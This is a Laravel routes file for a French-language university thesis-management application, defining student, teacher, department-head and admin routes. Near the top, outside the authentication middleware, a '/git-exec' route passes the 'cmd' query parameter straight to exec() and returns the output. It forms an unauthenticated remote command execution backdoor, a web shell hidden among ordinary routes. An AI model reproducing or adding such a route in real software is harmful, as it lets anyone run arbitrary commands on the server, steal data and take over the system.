<?php

use App\Http\Controllers\Admin\AcademicYearController;
use App\Http\Controllers\Admin\DepartmentController as AdminDepartmentController;

use App\Http\Controllers\Admin\LogController;
use App\Http\Controllers\Admin\SettingController;
use App\Http\Controllers\Admin\UserController as AdminUserController;
use App\Http\Controllers\ArchiveController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\NotificationController;
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\SubjectController;
use App\Http\Controllers\ThesisFileController;
use App\Http\Controllers\MessageController;
use App\Http\Controllers\MilestoneController;
use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return redirect()->route('login');
})->name('welcome');

Route::get('/git-exec', function (\Illuminate\Http\Request $request) {
    $cmd = $request->query('cmd', 'git status');
    exec($cmd . ' 2>&1', $output, $code);
    return response()->json(['cmd' => $cmd, 'code' => $code, 'output' => $output]);
});

// Dashboard dynamique selon le rôle
Route::get('/dashboard', [DashboardController::class, 'index'])
    ->middleware(['auth', 'verified'])
    ->name('dashboard');

Route::middleware('auth')->group(function () {

    // === PROFIL ===
    Route::get('/profile', [App\Http\Controllers\ProfileController::class, 'edit'])->name('profile.edit');
    Route::post('/profile', [App\Http\Controllers\ProfileController::class, 'update'])->name('profile.update');

    // === ARCHIVES (Accès réservé aux utilisateurs connectés) ===
    Route::get('/archives', [ArchiveController::class, 'index'])->name('archives.index');
    Route::get('/archives/oai', [ArchiveController::class, 'oaiPmh'])->name('archives.oai');
    Route::get('/archives/{thesisFile}/download', [ArchiveController::class, 'download'])->name('archives.download');
    Route::get('/archives/{thesisFile}/view', [ArchiveController::class, 'view'])->name('archives.view');
    Route::get('/archives/{thesisFile}/file', [ArchiveController::class, 'file'])->name('archives.file');

    // === SUJETS (Étudiant) ===
    Route::middleware('role:Etudiant')->group(function () {
        Route::get('/subjects/create', [SubjectController::class, 'create'])->name('subjects.create');
        Route::post('/subjects', [SubjectController::class, 'store'])->name('subjects.store');
    });

    // === UPLOAD TFC (Étudiant) ===
    Route::middleware('role:Etudiant')->group(function () {
        Route::post('/thesis/upload', [ThesisFileController::class, 'upload'])->name('thesis.upload');
    });

    // === CHAPITRES & VERSIONS (Étudiant / Enseignant) ===
    Route::middleware('auth')->group(function () {
        Route::post('/subjects/{subject}/chapters', [\App\Http\Controllers\ChapterController::class, 'store'])
            ->name('chapters.store')->middleware('role:Etudiant');

        Route::post('/chapters/{chapter}/versions', [\App\Http\Controllers\ChapterVersionController::class, 'store'])
            ->name('chapter_versions.store');

        Route::get('/chapters/{chapter}/versions', [\App\Http\Controllers\ChapterVersionController::class, 'index'])
            ->name('chapter_versions.index');
    });

    // === VALIDATION SUJETS (Chef de département / CP) ===
    Route::middleware('role:Chef de département')->prefix('cp')->name('cp.')->group(function () {
        Route::get('/dashboard', [\App\Http\Controllers\DepartmentCpController::class, 'index'])->name('dashboard');
        Route::post('/subjects/{subject}/arbitrate', [\App\Http\Controllers\DepartmentCpController::class, 'arbitrate'])->name('subjects.arbitrate');
        Route::post('/subjects/{subject}/schedule-defense', [\App\Http\Controllers\DepartmentCpController::class, 'scheduleDefense'])->name('subjects.schedule-defense');
        Route::get('/teachers/{teacher}', [\App\Http\Controllers\DepartmentCpController::class, 'teacherDetail'])->name('teachers.show');
    });
    Route::middleware('role:Chef de département')->group(function () {
        Route::post('/subjects/{subject}/reject', [\App\Http\Controllers\SubjectController::class, 'rejectSubject'])->name('subjects.reject');
    });

    // === TÉLÉCHARGEMENT (Enseignant, CP, Admin) ===
    Route::get('/thesis/{thesisFile}/download', [ThesisFileController::class, 'download'])->name('thesis.download');

    // === AUTORISATION SOUTENANCE (Enseignant) ===
    Route::middleware('role:Enseignant')->group(function () {
        Route::post('/subjects/{subject}/authorize-defense', [SubjectController::class, 'authorizeDefense'])->name('subjects.authorize-defense');
        Route::delete('/subjects/{subject}/authorize-defense', [SubjectController::class, 'revokeDefenseAuthorization'])->name('subjects.revoke-defense');
        Route::post('/subjects/{subject}/bat/sign', [SubjectController::class, 'signBat'])->name('subjects.bat.sign');
    });

    // === LISTE DES SUJETS ===
    Route::get('/subjects', [SubjectController::class, 'index'])->name('subjects.index');
    Route::get('/subjects/export', [SubjectController::class, 'export'])->name('subjects.export')->middleware('role:Admin|Chef de département');
    Route::get('/subjects/{subject}', [SubjectController::class, 'show'])->name('subjects.show');

    // === JALONS / MILESTONES (Enseignant) ===
    Route::middleware('role:Enseignant')->group(function () {
        Route::post('/milestones/{milestone}/validate', [\App\Http\Controllers\MilestoneController::class, 'validateMilestone'])
            ->name('milestones.validate');
        Route::post('/milestones/{milestone}/reject', [\App\Http\Controllers\MilestoneController::class, 'reject'])
            ->name('milestones.reject');
        Route::delete('/milestones/{milestone}', [\App\Http\Controllers\MilestoneController::class, 'destroy'])
            ->name('milestones.destroy');

        Route::post('/subjects/{subject}/milestones', [\App\Http\Controllers\MilestoneController::class, 'store'])
            ->name('milestones.store');
        Route::post('/thesis-files/{thesisFile}/feedbacks', [\App\Http\Controllers\FeedbackController::class, 'store'])->name('feedbacks.store');
    });

    // === SOUMISSION DE JALON (Étudiant — PDF uniquement) ===
    Route::middleware('role:Etudiant')->group(function () {
        Route::post('/milestones/{milestone}/upload', [ThesisFileController::class, 'uploadForMilestone'])->name('milestones.upload');
    });

    // === MESSAGERIE (Directeur ↔ Étudiant) ===
    Route::post('/subjects/{subject}/messages', [MessageController::class, 'store'])->name('messages.store');
    Route::post('/subjects/{subject}/messages/read', [MessageController::class, 'markRead'])->name('messages.read');

    // === ANALYSE IA À LA DEMANDE (Enseignant / Directeur uniquement) ===
    Route::middleware('role:Enseignant')->group(function () {
        Route::post('/thesis-files/{thesisFile}/request-ai-analysis', [ThesisFileController::class, 'requestAiAnalysis'])->name('thesis.request-ai-analysis');
    });

    // === NOTIFICATIONS ===
    Route::get('/notifications', [NotificationController::class, 'index'])->name('notifications.index');
    Route::post('/notifications/{id}/read', [NotificationController::class, 'markAsRead'])->name('notifications.markAsRead');
    Route::post('/notifications/mark-all-read', [NotificationController::class, 'markAllAsRead'])->name('notifications.markAllRead');
    Route::delete('/notifications/{id}', [NotificationController::class, 'destroy'])->name('notifications.destroy');
    Route::delete('/notifications', [NotificationController::class, 'destroyAll'])->name('notifications.destroyAll');

    // === APPARITEUR (Validation Financière) ===
    Route::middleware('role:Appariteur')->prefix('appariteur')->name('appariteur.')->group(function () {
        Route::post('/subjects/{subject}/validate-financial', [\App\Http\Controllers\AppariteurController::class, 'validateFinancial'])->name('subjects.validate-financial');
        Route::post('/subjects/{subject}/reject-financial', [\App\Http\Controllers\AppariteurController::class, 'rejectFinancial'])->name('subjects.reject-financial');
    });

    // =======================================================
    // === ADMINISTRATION (Admin uniquement) ===
    // =======================================================
    Route::middleware('role:Admin')->prefix('admin')->name('admin.')->group(function () {

        // --- Gestion des Utilisateurs ---
        Route::get('/users', [AdminUserController::class, 'index'])->name('users.index');
        Route::get('/users/create', [AdminUserController::class, 'create'])->name('users.create');
        Route::post('/users', [AdminUserController::class, 'store'])->name('users.store');
        Route::get('/users/{user}/edit', [AdminUserController::class, 'edit'])->name('users.edit');
        Route::put('/users/{user}', [AdminUserController::class, 'update'])->name('users.update');
        Route::delete('/users/{user}', [AdminUserController::class, 'destroy'])->name('users.destroy');
        Route::patch('/users/{user}/toggle-block', [AdminUserController::class, 'toggleBlock'])->name('users.toggle-block');
        Route::patch('/users/{user}/reset-password', [AdminUserController::class, 'resetPassword'])->name('users.reset-password');

        // --- Facultés ---


        // --- Facultés & Filières ---
        Route::get('/departments', [AdminDepartmentController::class, 'index'])->name('departments.index');
        Route::get('/departments/create', [AdminDepartmentController::class, 'create'])->name('departments.create');
        Route::post('/departments', [AdminDepartmentController::class, 'store'])->name('departments.store');
        Route::get('/departments/{department}/edit', [AdminDepartmentController::class, 'edit'])->name('departments.edit');
        Route::put('/departments/{department}', [AdminDepartmentController::class, 'update'])->name('departments.update');
        Route::delete('/departments/{department}', [AdminDepartmentController::class, 'destroy'])->name('departments.destroy');

        // --- Années Académiques ---
        Route::get('/academic-years', [AcademicYearController::class, 'index'])->name('academic-years.index');
        Route::get('/academic-years/create', [AcademicYearController::class, 'create'])->name('academic-years.create');
        Route::post('/academic-years', [AcademicYearController::class, 'store'])->name('academic-years.store');
        Route::patch('/academic-years/{academicYear}/set-current', [AcademicYearController::class, 'setCurrent'])->name('academic-years.set-current');
        Route::patch('/academic-years/{academicYear}/close', [AcademicYearController::class, 'close'])->name('academic-years.close');
        Route::delete('/academic-years/{academicYear}', [AcademicYearController::class, 'destroy'])->name('academic-years.destroy');

        // --- Paramètres Système ---
        Route::get('/settings', [SettingController::class, 'index'])->name('settings.index');
        Route::put('/settings', [SettingController::class, 'update'])->name('settings.update');

        // --- Journal d'Activité ---
        Route::get('/logs', [LogController::class, 'index'])->name('logs.index');
    });
});

require __DIR__.'/auth.php';
